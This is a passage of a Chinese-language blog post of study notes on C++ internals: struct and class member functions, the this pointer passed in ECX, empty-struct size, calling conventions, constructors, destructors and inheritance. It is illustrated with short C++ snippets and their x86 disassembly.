class=\"number\">4</span>],edx</span><br><span class=\"line\"><span class=\"number\">00401078</span> <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040107B</span> <span class=\"number\">89</span> <span class=\"number\">48</span> <span class=\"number\">08</span>             mov         dword ptr [eax+<span class=\"number\">8</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040107</span>E E8 <span class=\"number\">82</span> FF FF FF       call        @ILT+<span class=\"number\">0</span>(fun) (<span class=\"number\">00401005</span>)</span><br><span class=\"line\"><span class=\"number\">00401083</span> <span class=\"number\">83</span> C4 <span class=\"number\">0</span>C             add         esp,<span class=\"number\">0</span>Ch</span><br><span class=\"line\"></span><br><span class=\"line\">结构体作为参数时传的是结构体的副本，应该使用结构体指针</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Max</span><span class=\"params\">(haha* sb)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(sb-&gt;x &gt; sb-&gt;y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体指针用-&gt;取结构体的成员</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">haha</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Max</span><span class=\"params\">(haha* sb)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(sb-&gt;x &gt; sb-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体中不计算函数的大小</span></span><br><span class=\"line\"><span class=\"comment\">//函数在结构体里时会默认传递一个参数，即结构体的首地址，放在ECX中，用于标识成员在那个对象中</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当参数和变量同名时使用this</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">init</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;y = y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//返回当前对象首地址</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> *(<span class=\"type\">int</span>*)<span class=\"keyword\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//this不允许重新赋值</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225145426715.png\" alt=\"image-20230225145426715\"></p>\n<p>3. 孔结构体大小是多少</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x + <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x - <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x * <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x / <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCal haha;</span><br><span class=\"line\">\thaha.x = <span class=\"number\">5</span>;</span><br><span class=\"line\">\thaha.y = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = haha.<span class=\"built_in\">Add</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, a);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D768 C7 <span class=\"number\">45</span> F8 <span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-8</span>],<span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76F C7 <span class=\"number\">45</span> FC <span class=\"number\">02</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D776 <span class=\"number\">8</span>D <span class=\"number\">4</span>D F8             lea         ecx,[ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D779 E8 B4 <span class=\"number\">38</span> FF FF       call        @ILT+<span class=\"number\">45</span>(Cal::Add) (<span class=\"number\">00401032</span>)</span><br><span class=\"line\"><span class=\"number\">0040</span>D77E <span class=\"number\">89</span> <span class=\"number\">45</span> F4             mov         dword ptr [ebp<span class=\"number\">-0</span>Ch],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D781 <span class=\"number\">8B</span> <span class=\"number\">45</span> F4             mov         eax,dword ptr [ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">0040</span>D784 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D785 <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d %d %d %d\\n&quot;</span> (<span class=\"number\">0042201</span>c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D78A E8 <span class=\"number\">31</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">004010</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D78F 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D792 33 C0                <span class=\"keyword\">xor</span>         eax,eax</span></span><br><span class=\"line\"><span class=\"function\">0040D794 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D795 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D796 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D797 83 C4 4C             add         esp,4Ch</span></span><br><span class=\"line\"><span class=\"function\">0040D79A 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D79C E8 9F 39 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D7A1 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D7A3 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D7A4 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">0040D80A 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D80D 8B 45 FC             mov         eax,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D810 8B 00                mov         eax,dword ptr [eax]</span></span><br><span class=\"line\"><span class=\"function\">0040D812 8B 4D FC             mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D815 03 41 04             add         eax,dword ptr [ecx+4]</span></span><br><span class=\"line\"><span class=\"function\">0040D818 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D819 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D81A 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D81B 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D81D 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D81E C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//空结构体大小为1，如果没有成员变量只有成员函数，那么大小也是1</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, <span class=\"built_in\">sizeof</span>(Cal));   <span class=\"comment\">//1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, <span class=\"built_in\">sizeof</span>(Cal));   <span class=\"comment\">//1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//入栈顺序从右到左</span></span><br><span class=\"line\"><span class=\"comment\">//最后在把this使用ecx传参</span></span><br><span class=\"line\"><span class=\"comment\">//采用内平栈</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">init</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y, <span class=\"type\">int</span> z)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = y;\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;z = z;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCal haha;</span><br><span class=\"line\">\thaha.<span class=\"built_in\">init</span>(<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;%d \\n&quot;, a);</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D768 <span class=\"number\">6</span>A <span class=\"number\">05</span>                push        <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76A <span class=\"number\">6</span>A <span class=\"number\">04</span>                push        <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76C <span class=\"number\">6</span>A <span class=\"number\">03</span>                push        <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76E <span class=\"number\">8</span>D <span class=\"number\">4</span>D F4             lea         ecx,[ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">0040</span>D771 E8 C1 <span class=\"number\">38</span> FF FF       call        @ILT+<span class=\"number\">50</span>(Cal::init) (<span class=\"number\">00401037</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C9 <span class=\"number\">5B</span>                   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CA <span class=\"number\">8B</span> E5                mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CC <span class=\"number\">5</span>D                   pop         ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CD C2 <span class=\"number\">0</span>C <span class=\"number\">00</span>             ret         <span class=\"number\">0</span>Ch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"构造函数\"><a class=\"markdownIt-Anchor\" href=\"#构造函数\">#</a> 构造函数</h3>\n<p>1. 没有返回值</p>\n<p>2. 根类同名</p>\n<p>3. 在创建对象的时候调用</p>\n<p>可以重载构造函数，但参数不能完全一样</p>\n<p>成员函数也可以重载，名字一样，参数类型或者个数不一样</p>\n<h3 id=\"析构函数\"><a class=\"markdownIt-Anchor\" href=\"#析构函数\">#</a> 析构函数</h3>\n<p>堆是动态分配，自己申请自己释放</p>\n<p>析构函数不能重载</p>\n<p>不能有任何参数</p>\n<p>不能有返回值</p>\n<p>用于清理工作</p>\n<p>不一定一定要有</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Person</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* arr;</span><br><span class=\"line\">\t<span class=\"built_in\">Person</span>(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = y;</span><br><span class=\"line\">\t\tarr = (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t~<span class=\"built_in\">Person</span>()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(arr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"继承\"><a class=\"markdownIt-Anchor\" href=\"#继承\">#</a> 继承</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Man</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct Mankind:Man</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMankind m;</span><br><span class=\"line\">\tm.a = 1;</span><br><span class=\"line\">\tm.d = 2;</span><br><span class=\"line\">    std::cout &lt;&lt; &quot;Hello World!\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">上面的代码反汇编时和: 一样</span><br><span class=\"line\">struct Mankind</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>继承就是数据复制</p>\n<p>减少重复代码</p>\n<p>父类 基类</p>\n<p>子类 派生类</p>\n<p>可以用父类的指针访问子类的对象，但该指针不能访问子类特有的成员</p>\n<p>子类的指针访问父类的对象需要强转，但可能会访问到父类不存在的对象</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Man</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b;</span><br><span class=\"line\">&#125;;</span><br><span 